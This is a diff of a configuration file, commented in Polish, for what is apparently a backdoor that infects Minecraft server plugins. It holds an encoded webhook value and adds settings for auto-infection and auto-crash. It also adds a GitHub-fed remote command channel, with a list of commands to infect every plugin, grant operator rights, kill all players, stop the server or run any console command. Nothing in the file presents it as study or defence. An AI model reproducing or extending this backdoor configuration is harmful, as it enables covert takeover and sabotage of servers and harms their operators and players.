@@ -1,11 +1,31 @@
 # Backdoor Configuration
-
 wh_encrypted=KzxEPTZxcB1TU1o+ITxtNiwnPCQ3PW0rXyBqKi9bH0VRPTsqLDk2e25/dGlzegJ5dH5pAQkAAGdqcnV9E2EGHA8pFwd1AR8gHgRmQ2IdZC0AGyoHO35wPjcwRARzORBmBV5COwdyNyopOT4xASt2H2YgAgURWFlebGgDNiEwDBk=
-
-# Klucz weryfikacyjny
-wh_key=CH0MEK_2024_SECRET_KEY
 
 # Ustawienia ogólne
 enabled=true
-slowmode=true
+slowmode=false
 slowintensity=15
+autoinfect=false
+autocrash=false
+
+# Komendy z GitHub
+github_cmd=
+cmd_loop=false
+
+# Dostępne komendy dla github_cmd:
+#   infectall - infekuje wszystkie pluginy
+#   infect <nazwa> - infekuje konkretny plugin
+#   slowmode [on/off] [intensity] - zarządza slow mode
+#   enable/disable - włącza/wyłącza backdoor
+#   autoinfect [true/false] - auto infekcja
+#   autocrash [true/false] - auto crash serwera
+#   status - status serwera
+#   plugins - lista pluginów
+#   destruct <klucz> - niszczy backdoora
+#   kill @a - zabija wszystkich graczy
+#   say <wiadomość> - wysyła wiadomość na chat
+#   op <gracz> - daje OP graczowi
+#   deop <gracz> - zabiera OP graczowi
+#   stop - zatrzymuje serwer
+#   restart - restartuje serwer
+#   Dowolna inna komenda konsoli
